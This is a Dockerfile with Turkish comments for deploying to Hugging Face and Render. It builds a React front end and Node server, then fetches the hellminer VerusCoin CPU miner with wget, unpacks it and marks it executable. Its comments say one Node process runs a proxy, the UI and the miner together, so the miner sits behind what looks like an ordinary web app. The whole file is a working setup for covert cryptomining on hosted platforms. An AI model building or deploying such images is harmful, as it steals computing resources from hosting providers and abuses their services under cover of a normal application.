# Hugging Face ve Render için çoklu aşamalı (multi-stage) Dockerfile
FROM node:18-bullseye-slim AS builder

WORKDIR /app

# Paket dosyalarını kopyala ve React arayüzünü derle
COPY package*.json ./
RUN npm install

COPY . .
RUN npm run build

# ---
# Üretim (Production) İmajı
FROM node:18-bullseye-slim

WORKDIR /app

# Gerekli sistem paketlerini kuruyoruz (miner indirmek ve çalıştırmak için libgomp gibi kütüphaneler zorunludur)
RUN apt-get update && apt-get install -y wget tar curl libgomp1 && rm -rf /var/lib/apt/lists/*

# Backend dosyalarını ve paketlerini Server'a kur
COPY server/package*.json ./server/
RUN cd server && npm install --production
COPY server/index.js ./server/

# Frontend (Vite) derlenmiş dosyaları builder'dan Production'a al
COPY --from=builder /app/build ./public

# Resmi VerusCoin HellMiner'ını indiriyoruz (Luckpool official repo)
RUN wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz \
    && tar -xf hellminer_cpu_linux.tar.gz \
    && rm hellminer_cpu_linux.tar.gz \
    && chmod +x hellminer

ENV PORT=10000
EXPOSE $PORT

# Her şeyi kapsayan tek kanal index başlatıcımız (Proxy + UI + Hellminer)
CMD ["node", "server/index.js"]
